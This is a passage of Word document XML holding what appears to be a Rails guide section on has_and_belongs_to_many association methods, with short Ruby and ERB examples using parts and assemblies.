          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729E30BF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C11429" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In all of these methods, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the symbol passed as the first argument to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the singularized version of that symbol. For example, given the declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6EEB1B7B" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F2F3DA4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Part &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="125C80C4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01C49DEC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C8A3918" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Each instance of the part model will have these methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1965EF68" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DBD1E6A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies(force_reload = false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B44BA67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies&lt;&lt;(object, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66AFB87D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.delete(object, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E4580A7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies=objects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B65806D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assembly_ids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FFCB5E2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assembly_ids=ids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CDA623C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.clear</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10F78E69" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.empty?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="041F1A4E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.size</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3840D2BE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.find(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29E1838A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.where(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B8007AB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.exists?(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09B3105A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.build(attributes = {}, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35870F62" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assemblies.create(attributes = {})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="769E2339" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.1.1 Additional Column Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBA359F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the join table for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association has additional columns beyond the two foreign keys, these columns will be added as attributes to records retrieved via that association. Records returned with additional attributes will always be read-only, because Rails cannot save changes to those attributes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A7EE9A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The use of extra attributes on the join table in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association is deprecated. If you require this sort of complex behavior on the table that joins two models in a many-to-many relationship, you should use a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association instead of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42795B9E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BC95CA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns an array of all of the associated objects. If there are no associated objects, it returns an empty array.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3744"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3BAE106D" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11CB349C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1018704403"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assemblies</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assemblies</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FB8F194" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1518754A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method adds one or more objects to the collection by creating records in the join table.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6383C346" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66584609" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1053775110"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@part.assemblies &lt;&lt; @assembly1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50E745DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is aliased as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.concat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.push</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53705600" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A01D9C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method removes one or more objects from the collection by deleting records in the join table. This does not destroy the objects.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3BB7D944" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="749CBAD1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="845755192"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@part.assemblies.delete(@assembly1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1716CA91" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6065CD61" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method makes the collection contain only the supplied objects, by adding and deleting as appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C84DEA0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505D788A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns an array of the ids of the objects in the collection.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4224"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1553CEE3" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2CE62CDC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1287850683"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@assembly_ids</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @part.assembly_ids</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B34A192" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D274657" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method makes the collection contain only the objects identified by the supplied primary key values, by adding and deleting as appropriate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C24B74" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D55E70" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method removes every object from the collection by deleting the rows from the joining table. This does not destroy the associated objects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42949221" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.1.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B6D29B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the collection does not contain any associated objects.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5231"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0522BFA8" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78BA5D3F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@part.assemblies.empty? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20982B08" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  This part is not</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>used in</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
